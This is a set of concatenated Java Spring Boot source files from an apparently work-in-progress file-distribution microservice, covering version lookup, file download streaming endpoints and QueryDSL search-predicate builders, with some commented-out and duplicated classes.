                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, versionParameters));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public VersionEntity deleteVersionRecord(final VersionParameters versionParameters) {
        log.info("Deleting version record by input parameters: {}", versionParameters);
        return this.getVersionRecord(versionParameters)
                .map(entity -> {
                    final Set<VersionEntity> versions = entity.getProduct().getVersions();
                    Optional.ofNullable(versions).ifPresent(v -> v.removeIf(current -> Objects.equals(current, entity)));
                    this.delete(entity);
                    return entity;
                })
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, versionParameters));
    }

    public Iterable<VersionEntity> searchVersions(final String searchText, int pageNo, int resultsPerPage) {
        final FullTextQuery jpaQuery = this.searchVersionsQuery(searchText);
        jpaQuery.setMaxResults(resultsPerPage);
        jpaQuery.setFirstResult((pageNo - 1) * resultsPerPage);
        return jpaQuery.getResultList();
    }

    public int searchVersionsTotalCount(final String searchText) {
        final FullTextQuery jpaQuery = this.searchVersionsQuery(searchText);
        return jpaQuery.getResultSize();
    }

    private FullTextQuery searchVersionsQuery(final String searchText) {
        final FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(this.getEntityManager());
        final QueryBuilder queryBuilder = fullTextEntityManager.getSearchFactory()
                .buildQueryBuilder()
                .forEntity(VersionEntity.class)
                .get();

        final org.apache.lucene.search.Query luceneQuery = queryBuilder
                .keyword()
                .wildcard()
                .onField("version")
                .boostedTo(5f)
                .matching(searchText + "*")
                .createQuery();
        return fullTextEntityManager.createFullTextQuery(luceneQuery, VersionEntity.class);
    }

    /**
     * Returns {@link FileEntity} by input search parameters
     *
     * @param product  - initial input {@link String} product name
     * @param version  - intial input {@link String} version name
     * @param locale   - initial input {@link String} locale name
     * @param platform - initial input {@link String} platform name
     * @return {@link FileEntity}
     */
    public FileEntity getBinaryRecordByParams(final String product, final String version, final String locale, final String platform) {
        log.info("Fetching binary record by input parameters: product: {}, version: {}, locale: {}, platform: {}", product, version, locale, platform);
        final Predicate predicate = this.buildBinaryRecordSearchPredicate(product, version, locale, platform);
        return this.fileRepository.findOne(predicate).orElseThrow(() -> throwInvalidParameter(this.getMessageSource(), asList(product, version, locale, platform)));
    }

    /**
     * Returns search {@link Predicate} by input search parameters
     *
     * @param product  - initial input {@link String} product name
     * @param version  - intial input {@link String} version name
     * @param locale   - initial input {@link String} locale name
     * @param platform - initial input {@link String} platform name
     * @return search {@link Predicate}
     */
    private Predicate buildBinaryRecordSearchPredicate(final String product, final String version, final String locale, final String platform) {
        if (StringUtils.isBlank(version)) {
            return QVersionEntity.versionEntity.versionInfo().isNotNull();
        } else {
            final VersionInfoEntity versionInfoEntity = this.buildVersionInfo(version);
            return QFileEntity.fileEntity.version().product().name.equalsIgnoreCase(product)
                    .and(QFileEntity.fileEntity.version().versionInfo().eq(versionInfoEntity))
                    .and(QFileEntity.fileEntity.version().locale.equalsIgnoreCase(locale))
                    .and(QFileEntity.fileEntity.fileInfo().filePlatform.eq(platform));
        }
    }

    /**
     * Returns {@link VersionInfoEntity} by input {@link String} version
     *
     * @param version - initial input {@link String} version
     * @return {@link VersionInfoEntity}
     */
    private VersionInfoEntity buildVersionInfo(final String version) {
        try {
            return new VersionInfoEntity(this.getConversionService().convert(version, int[].class));
        } catch (IllegalArgumentException ex) {
            throw throwInvalidFormat(this.getMessageSource(), ERROR_VERSION_FORMAT_INVALID_MESSAGE_TEMPLATE, version);
        }
    }

    @Override
    protected VersionRepository getRepository() {
        return this.versionRepository;
    }
}
package com.paragon.microservices.distributor.controller.impl;

import com.google.common.io.ByteStreams;
import com.paragon.microservices.distributor.controller.interfaces.DownloadController;
import com.paragon.microservices.distributor.model.domain.*;
import com.paragon.microservices.distributor.model.entity.FileEntity;
import com.paragon.microservices.distributor.model.entity.ProductEntity;
import com.paragon.microservices.distributor.model.entity.VersionEntity;
import com.paragon.microservices.distributor.model.enumeration.DownloadStatus;
import com.paragon.microservices.distributor.model.search.SearchOperation;
import com.paragon.microservices.distributor.model.search.SearchPredicatesBuilder;
import com.paragon.microservices.distributor.repository.ProductRepository;
import com.paragon.microservices.distributor.repository.VersionRepository;
import com.paragon.microservices.distributor.service.impl.VersionServiceImpl;
import com.paragon.microservices.distributor.service.interfaces.DownloadService;
import com.paragon.microservices.distributor.service.interfaces.FileTransferService;
import com.paragon.microservices.distributor.service.interfaces.SessionService;
import com.paragon.microservices.distributor.system.constraint.FileNamePattern;
import com.querydsl.core.types.Predicate;
import com.querydsl.core.types.dsl.BooleanExpression;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.context.MessageSource;
import org.springframework.data.querydsl.binding.QuerydslPredicate;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;
import org.springframework.web.servlet.view.RedirectView;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static com.paragon.microservices.distributor.system.utils.HeaderUtils.getFileDownloadHeaders;

/**
 * {@link DownloadController} implementation
 */
@Slf4j
@Getter(AccessLevel.PROTECTED)
@RestController
@Transactional(rollbackFor = Exception.class, readOnly = true)
@RequestMapping(
        value = "/api/v0/distributor/download",
        produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}
)
public class DownloadControllerImpl extends BaseControllerImpl implements DownloadController {
    private final DownloadService downloadService;
    private final FileTransferService fileTransferService;
    private final ApplicationEventPublisher eventPublisher;

    @Autowired
    public DownloadControllerImpl(final MessageSource messageSource,
                                  final DownloadService downloadService,
                                  final FileTransferService fileTransferService,
                                  final ApplicationEventPublisher eventPublisher) {
        super(messageSource);
        this.downloadService = downloadService;
        this.fileTransferService = fileTransferService;
        this.eventPublisher = eventPublisher;
    }

    @Override
    @GetMapping(params = {"productId", "!product"})
    public RedirectView generateDownloadLink(final UUID productId, final UUID versionId, final UUID binaryId, final AuthenticatedUser authenticatedUser) {
        final DownloadLink downloadLink = this.getDownloadService().generateDownloadLink(binaryId, authenticatedUser.getUserId());
        final RedirectView redirectView = new RedirectView(downloadLink.getUrl(), true);
        redirectView.setStatusCode(HttpStatus.PERMANENT_REDIRECT);
        return redirectView;
    }

    @Override
    @GetMapping(params = {"product", "!productId"})
    public RedirectView generateDownloadLink(final String product, final String version, final String locale, final String platform) {
        return null;
    }

    @GetMapping("/{sessionId}/{fileName}")
    @Override
    public ResponseEntity<StreamingResponseBody> getResourceAsStream(@PathVariable final UUID sessionId, @PathVariable @FileNamePattern final String fileName) {
        final FileData fileData = this.getFileTransferService().getFileData(sessionId);
        final StreamingResponseBody stream = this.toByteStreamResponseBody(fileData);
        return ResponseEntity.ok()
                .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                .body(stream);
    }

    @GetMapping("/2/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream2(@PathVariable final UUID sessionId, @PathVariable @FileNamePattern final String fileName) {
        final FileData fileData = this.getFileTransferService().getFileData(sessionId);
        final StreamingResponseBody stream = this.toZipStreamResponseBody(fileData);
        return ResponseEntity.ok()
                .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                .body(stream);
    }

    @GetMapping("/3/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream3(@PathVariable final UUID sessionId, @PathVariable @FileNamePattern final String fileName) {
        final FileData fileData = this.getFileTransferService().getFileData(sessionId);
        final StreamingResponseBody stream = this.toBufferedStreamResponseBody(fileData);
        return ResponseEntity.ok()
                .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                .body(stream);
    }

    @GetMapping("/4/{sessionId}/{fileName}")
    public ResponseEntity<StreamingResponseBody> getResourceAsStream4(@PathVariable final UUID sessionId, @PathVariable @FileNamePattern final String fileName) {
        final FileData fileData = this.getFileTransferService().getFileData(sessionId);
        final StreamingResponseBody stream = this.toStreamResponseBody(fileData);
        return ResponseEntity.ok()
                .headers(getFileDownloadHeaders(fileData.getFileMetaData()))
                .body(stream);
    }

    @Autowired
    private SessionService sessionService;
    @Autowired
    private ProductRepository productRepository;
    @Autowired
    private VersionServiceImpl versionService;
    @Autowired
    private VersionRepository versionRepository;

    @GetMapping("/version")
    public ResponseEntity<Integer> version(@RequestParam(name = "search") final String search) {
        return ResponseEntity.ok().body(this.getVersionService().searchVersionsTotalCount(search));
    }

    @RequestMapping(method = RequestMethod.GET, value = "/api/myusers")
    @ResponseBody
    public Iterable<VersionEntity> findAllByWebQuerydsl(@QuerydslPredicate(root = VersionEntity.class) Predicate predicate) {
        return this.getVersionRepository().findAll(predicate);
    }

    @RequestMapping(method = RequestMethod.GET, value = "/myusers2")
    @ResponseBody
    public FileEntity findAllByQueryds2(@RequestParam(value = "product") String product,
                                        @RequestParam(value = "version") String version,
                                        @RequestParam(value = "locale") String locale,
                                        @RequestParam(value = "platform") String platform) {
        return this.versionService.getBinaryRecordByParams(product, version, locale, platform);
    }

    @RequestMapping(method = RequestMethod.GET, value = "/myusers")
    @ResponseBody
    public Iterable<VersionEntity> findAllByQuerydsl(@RequestParam(value = "search") String search) {
        final SearchPredicatesBuilder builder = new SearchPredicatesBuilder();
        if (search != null) {
            final Pattern pattern = Pattern.compile("(\\w+?)(:|<|>)(\\w+?),");
            final Matcher matcher = pattern.matcher(search + ",");
            while (matcher.find()) {
                builder.with(matcher.group(1), SearchOperation.findByOperation(matcher.group(2)), matcher.group(3));
            }
        }
        final BooleanExpression exp = builder.build(VersionEntity.class);
        return this.getVersionRepository().findAll(exp);
    }

//    @RequestMapping(method = RequestMethod.GET, value = "/users")
//    @ResponseBody
//    public List<VersionEntity> findAll(@RequestParam(value = "search", required = false) String search) {
//        final List<SearchCriteria> params = new ArrayList<>();
//        if (search != null) {
//            final Pattern pattern = Pattern.compile("(\\w+?)(:|<|>)(\\w+?),");
//            final Matcher matcher = pattern.matcher(search + ",");
//            while (matcher.find()) {
//                params.add(SearchCriteria.of(matcher.group(1), SearchOperation.findByOperation(matcher.group(2)), matcher.group(3)));
//            }
//        }
//        return this.versionService.searchUser(params);
//    }

    @GetMapping("/user")
    public ResponseEntity<CompletableFuture<Iterable<ProductEntity>>> user() {
        return ResponseEntity.ok().body(this.getProductRepository().findByUserIsCurrentUser());
    }

    @GetMapping("/created")
    public ResponseEntity init() {
        final Session session = new Session();
        session.setId("c108cda3-8b4b-483d-a987-d65e6bfe3024");
        session.setFilepath("C:\\git-project\\paragon.microservices.distributor");
        session.setFilename("lombok.config");
        session.setDownloadStatus(DownloadStatus.NEW);
        this.getSessionService().save(session);
        return ResponseEntity.ok().build();
    }

    private StreamingResponseBody toByteStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            try {
                ByteStreams.copy(fileData.getFileStream(), outputStream);
                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toZipStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            final ZipOutputStream zipOut = new ZipOutputStream(outputStream);
            try {
                final ZipEntry zipEntry = new ZipEntry(fileData.getFileMetaData().getFileName());
                zipOut.putNextEntry(zipEntry);

                final byte[] bytes = new byte[1024];
                int length;
                while ((length = fileData.getFileStream().read(bytes)) >= 0) {
                    zipOut.write(bytes, 0, length);
                }
                fileData.getFileStream().close();
                zipOut.close();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (final IOException ex) {
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toBufferedStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
            try (final BufferedInputStream br = new BufferedInputStream(fileData.getFileStream())) {
                byte[] contents = new byte[1024];
                while (br.read(contents) != -1) {
                    outputStream.write(contents);
                    outputStream.flush();
                    contents = new byte[1024];
                }
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked !", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            try {
                this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
                IOUtils.copyLarge(fileData.getFileStream(), outputStream);
                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked!", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private Consumer<DownloadStatus> notifyEvent(final FileData fileData) {
        return status -> this.getEventPublisher().publishEvent(new DownloadEvent(this, MessageEntity.of(fileData.getSessionId(), status)));
    }
}

--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.model.search;
//
//import java.util.Arrays;
//import java.util.Collections;
//import java.util.Deque;
//import java.util.HashMap;
//import java.util.LinkedList;
//import java.util.Map;
//import java.util.regex.Matcher;
//import java.util.regex.Pattern;
//
//import com.google.common.base.Joiner;
//
//public class CriteriaParser {
//
//    private static Map<String, Operator> ops;
//
//    private static Pattern SpecCriteraRegex = Pattern.compile("^(\\w+?)(" + Joiner.on("|")
//        .join(SearchOperation.SIMPLE_OPERATION_SET) + ")(\\p{Punct}?)(\\w+?)(\\p{Punct}?)$");
//
//    private enum Operator {
//        OR(1), AND(2);
//        final int precedence;
//
//        Operator(int p) {
//            precedence = p;
//        }
//    }
//
//    static {
//        Map<String, Operator> tempMap = new HashMap<>();
//        tempMap.put("AND", Operator.AND);
//        tempMap.put("OR", Operator.OR);
//        tempMap.put("or", Operator.OR);
//        tempMap.put("and", Operator.AND);
//
//        ops = Collections.unmodifiableMap(tempMap);
//    }
//
//    private static boolean isHigerPrecedenceOperator(String currOp, String prevOp) {
//        return (ops.containsKey(prevOp) && ops.get(prevOp).precedence >= ops.get(currOp).precedence);
//    }
//
//    public Deque<?> parse(String searchParam) {
//
//        Deque<Object> output = new LinkedList<>();
//        Deque<String> stack = new LinkedList<>();
//
//        Arrays.stream(searchParam.split("\\s+")).forEach(token -> {
//            if (ops.containsKey(token)) {
//                while (!stack.isEmpty() && isHigerPrecedenceOperator(token, stack.peek()))
//                    output.push(stack.pop()
//                        .equalsIgnoreCase(SearchOperation.OR_OPERATOR) ? SearchOperation.OR_OPERATOR : SearchOperation.AND_OPERATOR);
//                stack.push(token.equalsIgnoreCase(SearchOperation.OR_OPERATOR) ? SearchOperation.OR_OPERATOR : SearchOperation.AND_OPERATOR);
//            } else if (token.equals(SearchOperation.LEFT_PARANTHESIS)) {
//                stack.push(SearchOperation.LEFT_PARANTHESIS);
//            } else if (token.equals(SearchOperation.RIGHT_PARANTHESIS)) {
//                while (!stack.peek()
//                    .equals(SearchOperation.LEFT_PARANTHESIS))
//                    output.push(stack.pop());
//                stack.pop();
//            } else {
//
//                Matcher matcher = SpecCriteraRegex.matcher(token);
//                while (matcher.find()) {
//                    output.push(new SpecSearchCriteria(matcher.group(1), matcher.group(2), matcher.group(3), matcher.group(4), matcher.group(5)));
//                }
//            }
//        });
//
//        while (!stack.isEmpty())
//            output.push(stack.pop());
//
//        return output;
//    }
//
//}

package com.paragon.microservices.distributor.model.search;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.springframework.validation.annotation.Validated;

import javax.validation.constraints.NotBlank;
import javax.validation.constraints.NotNull;

/**
 * Search criteria model
 *
 * @param <T> type of search value
 */
@Data
@Builder
@Validated
@NoArgsConstructor
@AllArgsConstructor
public class SearchCriteria<T> {
    @NotBlank(message = "{model.domain.search-criteria.key.notBlank}")
    private String key;

    @NotNull(message = "{model.domain.search-criteria.operation.notNull}")
    private SearchOperation operation;

    @NotBlank(message = "{model.domain.search-criteria.value.notBlank}")
    private T value;

    /**
     * Returns new {@link SearchCriteria} by input arguments
     *
     * @param <T>       type of search value
     * @param key       - initial input {@link String} key
     * @param operation - initial input {@link SearchOperation}
     * @param value     - initial input {@link String} value
     * @return new {@link SearchCriteria}
     */
    public static <T> SearchCriteria<T> of(final String key, final SearchOperation operation, final T value) {
        return new SearchCriteria<>(key, operation, value);
    }
}
package com.paragon.microservices.distributor.model.search;

import com.fasterxml.jackson.annotation.JsonCreator;
import lombok.Getter;
import lombok.RequiredArgsConstructor;

import javax.annotation.Nullable;
import java.util.Arrays;
import java.util.Objects;

@Getter
@RequiredArgsConstructor
public enum SearchOperation {
    EQUALITY(":"),
    NEGATION("!"),
    GREATER_THAN(">"),
    LESS_THAN("<"),
    LIKE("~"),
    STARTS_WITH("!<"),
    ENDS_WITH(">!"),
    CONTAINS("_");

    /**
     * Symbolic operation value
     */
    private final String operation;

    public static final String[] SIMPLE_OPERATION_SET = {":", "!", ">", "<", "~"};
    public static final String OR_PREDICATE_FLAG = "'";
    public static final String ZERO_OR_MORE_REGEX = "*";
    public static final String OR_OPERATOR = "OR";
    public static final String AND_OPERATOR = "AND";
    public static final String LEFT_PARANTHESIS = "(";
    public static final String RIGHT_PARANTHESIS = ")";

    /**
     * Returns {@link SearchOperation} by input {@link String}
     *
     * @param operation - initial input {@link String} operation
     * @return {@link SearchOperation}
     */
    @JsonCreator
    @Nullable
    public static SearchOperation findByOperation(final String operation) {
        return Arrays.stream(values())
                .filter(type -> type.getOperation().equalsIgnoreCase(operation))
                .findFirst()
                .orElse(null);
    }

    /**
     * Checks whether input {@link SearchOperation} is equal to {@code EQUALITY}
     *
     * @param operation - initial input {@link SearchOperation}
     * @return true - if input {@link SearchOperation} is {@code EQUALITY}, false - otherwise
     */
    public static boolean isEqual(final SearchOperation operation) {
        return Objects.equals(operation, EQUALITY);
    }

    /**
     * Checks whether input {@link SearchOperation} is equal to {@code GREATER_THAN}
     *
     * @param operation - initial input {@link SearchOperation}
     * @return true - if input {@link SearchOperation} is {@code GREATER_THAN}, false - otherwise
     */
    public static boolean isGreater(final SearchOperation operation) {
        return Objects.equals(operation, GREATER_THAN);
    }

    /**
     * Checks whether input {@link SearchOperation} is equal to {@code LESS_THAN}
     *
     * @param operation - initial input {@link SearchOperation}
     * @return true - if input {@link SearchOperation} is {@code LESS_THAN}, false - otherwise
     */
    public static boolean isLess(final SearchOperation operation) {
        return Objects.equals(operation, LESS_THAN);
    }
}
package com.paragon.microservices.distributor.model.search;

import com.querydsl.core.types.dsl.BooleanExpression;
import com.querydsl.core.types.dsl.NumberPath;
import com.querydsl.core.types.dsl.PathBuilder;
import com.querydsl.core.types.dsl.StringPath;

import static org.hibernate.query.criteria.internal.ValueHandlerFactory.isNumeric;

/**
 * Search predicate model
 *
 * @param <T> type of criteria search
 */
public class SearchPredicate<T> {
    private final SearchCriteria<T> criteria;
    private final Class<? extends T> typeClass;

    public SearchPredicate(final SearchCriteria<T> criteria, final Class<? extends T> typeClass) {
        this.criteria = criteria;
        this.typeClass = typeClass;
    }

    public BooleanExpression getPredicate() {
        final PathBuilder<T> entityPath = new PathBuilder<>(this.typeClass, this.typeClass.getSimpleName());
        if (isNumeric(this.criteria.getValue())) {
            final NumberPath<Integer> path = entityPath.getNumber(this.criteria.getKey(), Integer.class);
            final Integer value = Integer.parseInt(this.criteria.getValue().toString());
            switch (this.criteria.getOperation()) {
                case EQUALITY:
                    return path.eq(value);
                case GREATER_THAN:
                    return path.goe(value);
                case LESS_THAN:
                    return path.loe(value);
            }
        }
        final StringPath path = entityPath.getString(this.criteria.getKey());
        if (SearchOperation.isEqual(this.criteria.getOperation())) {
            return path.containsIgnoreCase(this.criteria.getValue().toString());
        }
        return null;
    }
}

package com.paragon.microservices.distributor.model.search;

import com.querydsl.core.types.dsl.BooleanExpression;
import com.querydsl.core.types.dsl.Expressions;
import org.springframework.util.CollectionUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

public class SearchPredicatesBuilder<T> {
    private final List<SearchCriteria<T>> params;

    public SearchPredicatesBuilder() {
        this.params = new ArrayList<>();
    }

    public SearchPredicatesBuilder with(final String key, final SearchOperation operation, final T value) {
        this.params.add(SearchCriteria.of(key, operation, value));
        return this;
    }

    public BooleanExpression build(final Class<? extends T> typeClass) {
        if (CollectionUtils.isEmpty(this.params)) {
            return null;
        }

        final List<BooleanExpression> predicates = this.params.stream()
                .map(param -> {
                    final SearchPredicate predicate = new SearchPredicate(param, typeClass);
                    return predicate.getPredicate();
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toList());

        BooleanExpression result = Expressions.asBoolean(true).isTrue();
        for (final BooleanExpression predicate : predicates) {
            result = result.and(predicate);
        }
        return result;
    }
}

//package com.paragon.microservices.distributor.model.search;
//
//public class SpecSearchCriteria {
//
//    private String key;
//    private SearchOperation operation;
//    private Object value;
//    private boolean orPredicate;
//
//    public SpecSearchCriteria() {
//
//    }
//
//    public SpecSearchCriteria(final String key, final SearchOperation operation, final Object value) {
//        super();
//        this.key = key;
//        this.operation = operation;
//        this.value = value;
//    }
//
//    public SpecSearchCriteria(final String orPredicate, final String key, final SearchOperation operation, final Object value) {
//        super();
//        this.orPredicate = orPredicate != null && orPredicate.equals(SearchOperation.OR_PREDICATE_FLAG);
//        this.key = key;
//        this.operation = operation;
//        this.value = value;
//    }
//
//    public SpecSearchCriteria(String key, String operation, String prefix, String value, String suffix) {
//        SearchOperation op = SearchOperation.getOperation(operation.charAt(0));
//        if (op != null) {
//            if (op == SearchOperation.EQUALITY) { // the operation may be complex operation
//                final boolean startWithAsterisk = prefix != null && prefix.contains(SearchOperation.ZERO_OR_MORE_REGEX);
//                final boolean endWithAsterisk = suffix != null && suffix.contains(SearchOperation.ZERO_OR_MORE_REGEX);
//
//                if (startWithAsterisk && endWithAsterisk) {
//                    op = SearchOperation.CONTAINS;
//                } else if (startWithAsterisk) {
//                    op = SearchOperation.ENDS_WITH;
//                } else if (endWithAsterisk) {
//                    op = SearchOperation.STARTS_WITH;
//                }
//            }
//        }
//        this.key = key;
//        this.operation = op;
//        this.value = value;
//    }
//
//    public String getKey() {
//        return key;
//    }
//
//    public void setKey(final String key) {
//        this.key = key;
//    }
//
//    public SearchOperation getOperation() {
//        return operation;
//    }
//
//    public void setOperation(final SearchOperation operation) {
//        this.operation = operation;
//    }
//
//    public Object getValue() {
//        return value;
//    }
//
//    public void setValue(final Object value) {
//        this.value = value;
//    }
//
//    public boolean isOrPredicate() {
//        return orPredicate;
//    }
//
//    public void setOrPredicate(boolean orPredicate) {
//        this.orPredicate = orPredicate;
//    }
//
//}package com.paragon.microservices.distributor.model.search;

import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.Predicate;
import javax.persistence.criteria.Root;
import java.util.function.Consumer;

public class UserSearchQueryCriteriaConsumer implements Consumer<SearchCriteria> {
    private Predicate predicate;
    private final CriteriaBuilder builder;
    private final Root root;

    public UserSearchQueryCriteriaConsumer(final Predicate predicate, final CriteriaBuilder builder, final Root root) {
        this.predicate = predicate;
        this.builder = builder;
        this.root = root;
    }

    @Override
    public void accept(SearchCriteria param) {
        if (SearchOperation.GREATER_THAN.equals(param.getOperation())) {
            this.predicate = this.builder.and(this.predicate, builder.greaterThanOrEqualTo(this.root.get(param.getKey()), param.getValue().toString()));
        } else if (SearchOperation.LESS_THAN.equals(param.getOperation())) {
            this.predicate = this.builder.and(this.predicate, this.builder.lessThanOrEqualTo(this.root.get(param.getKey()), param.getValue().toString()));
        } else if (SearchOperation.EQUALITY.equals(param.getOperation())) {
            if (root.get(param.getKey()).getJavaType() == String.class) {
                this.predicate = this.builder.and(this.predicate, this.builder.like(this.root.get(param.getKey()), "%" + param.getValue() + "%"));
            } else {
                this.predicate = this.builder.and(this.predicate, this.builder.equal(this.root.get(param.getKey()), param.getValue()));
            }
        }
    }

    public Predicate getPredicate() {
        return this.predicate;
    }
}

package com.paragon.microservices.distributor.model.search;

import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.Predicate;
import javax.persistence.criteria.Root;
import java.util.function.Consumer;

public class UserSearchQueryCriteriaConsumer implements Consumer<SearchCriteria> {
    private Predicate predicate;
    private final CriteriaBuilder builder;
    private final Root root;

    public UserSearchQueryCriteriaConsumer(final Predicate predicate, final CriteriaBuilder builder, final Root root) {
        this.predicate = predicate;
        this.builder = builder;
        this.root = root;
    }

    @Override
    public void accept(SearchCriteria param) {
        if (SearchOperation.GREATER_THAN.equals(param.getOperation())) {
            this.predicate = this.builder.and(this.predicate, builder.greaterThanOrEqualTo(this.root.get(param.getKey()), param.getValue().toString()));
        } else if (SearchOperation.LESS_THAN.equals(param.getOperation())) {
            this.predicate = this.builder.and(this.predicate, this.builder.lessThanOrEqualTo(this.root.get(param.getKey()), param.getValue().toString()));
        } else if (SearchOperation.EQUALITY.equals(param.getOperation())) {
            if (root.get(param.getKey()).getJavaType() == String.class) {
                this.predicate = this.builder.and(this.predicate, this.builder.like(this.root.get(param.getKey()), "%" + param.getValue() + "%"));
            } else {
                this.predicate = this.builder.and(this.predicate, this.builder.equal(this.root.get(param.getKey()), param.getValue()));
            }
        }
    }

    public Predicate getPredicate() {
        return this.predicate;
    }
}

//package com.paragon.microservices.distributor.model.search;
//
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import org.springframework.data.jpa.domain.Specification;
//
//import javax.persistence.criteria.CriteriaBuilder;
//import javax.persistence.criteria.CriteriaQuery;
//import javax.persistence.criteria.Predicate;
//import javax.persistence.criteria.Root;
//
//public class UserSpecification implements Specification<VersionEntity> {
//
//    private SpecSearchCriteria criteria;
//
//    public UserSpecification(final SpecSearchCriteria criteria) {
//        super();
//        this.criteria = criteria;
//    }
//
//    public SpecSearchCriteria getCriteria() {
//        return criteria;
//    }
//
//    @Override
//    public Predicate toPredicate(final Root<VersionEntity> root, final CriteriaQuery<?> query, final CriteriaBuilder builder) {
//        switch (criteria.getOperation()) {
//            case EQUALITY:
//                return builder.equal(root.get(criteria.getKey()), criteria.getValue());
//            case NEGATION:
//                return builder.notEqual(root.get(criteria.getKey()), criteria.getValue());
//            case GREATER_THAN:
//                return builder.greaterThan(root.get(criteria.getKey()), criteria.getValue().toString());
//            case LESS_THAN:
//                return builder.lessThan(root.get(criteria.getKey()), criteria.getValue().toString());
//            case LIKE:
//                return builder.like(root.get(criteria.getKey()), criteria.getValue().toString());
//            case STARTS_WITH:
//                return builder.like(root.get(criteria.getKey()), criteria.getValue() + "%");
//            case ENDS_WITH:
//                return builder.like(root.get(criteria.getKey()), "%" + criteria.getValue());
//            case CONTAINS:
//                return builder.like(root.get(criteria.getKey()), "%" + criteria.getValue() + "%");
//            default:
//                return null;
//        }
//    }
//}

//package com.paragon.microservices.distributor.model.search;
//
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import org.springframework.data.jpa.domain.Specification;
//
//import java.util.ArrayList;
//import java.util.List;
//
//public final class UserSpecificationsBuilder {
//
//    private final List<SpecSearchCriteria> params;
//
//    public UserSpecificationsBuilder() {
//        params = new ArrayList<>();
//    }
//
//    public final UserSpecificationsBuilder with(final String key, final String operation, final Object value, final String prefix, final String suffix) {
//        return with(null, key, operation, value, prefix, suffix);
//    }
//
//    public final UserSpecificationsBuilder with(final String orPredicate, final String key, final String operation, final Object value, final String prefix, final String suffix) {
//        SearchOperation op = SearchOperation.getOperation(operation.charAt(0));
//        if (op != null) {
//            if (op == SearchOperation.EQUALITY) { // the operation may be complex operation
//                final boolean startWithAsterisk = prefix != null && prefix.contains(SearchOperation.ZERO_OR_MORE_REGEX);
//                final boolean endWithAsterisk = suffix != null && suffix.contains(SearchOperation.ZERO_OR_MORE_REGEX);
//
//                if (startWithAsterisk && endWithAsterisk) {
//                    op = SearchOperation.CONTAINS;
//                } else if (startWithAsterisk) {
//                    op = SearchOperation.ENDS_WITH;
//                } else if (endWithAsterisk) {
//                    op = SearchOperation.STARTS_WITH;
//                }
//            }
//            params.add(new SpecSearchCriteria(orPredicate, key, op, value));
//        }
//        return this;
//    }
//
//    public Specification<VersionEntity> build() {
//        if (params.size() == 0)
//            return null;
//
//        Specification<VersionEntity> result = new UserSpecification(params.get(0));
//
//        for (int i = 1; i < params.size(); i++) {
//            result = params.get(i).isOrPredicate()
//                    ? Specification.where(result).or(new UserSpecification(params.get(i)))
//                    : Specification.where(result).and(new UserSpecification(params.get(i)));
//        }
//
//        return result;
//    }
//
//    public final UserSpecificationsBuilder with(UserSpecification spec) {
//        params.add(spec.getCriteria());
//        return this;
//    }
//
//    public final UserSpecificationsBuilder with(SpecSearchCriteria criteria) {
//        params.add(criteria);
//        return this;
//    }
//}
--------------------------------------------------------------------------------------------------------
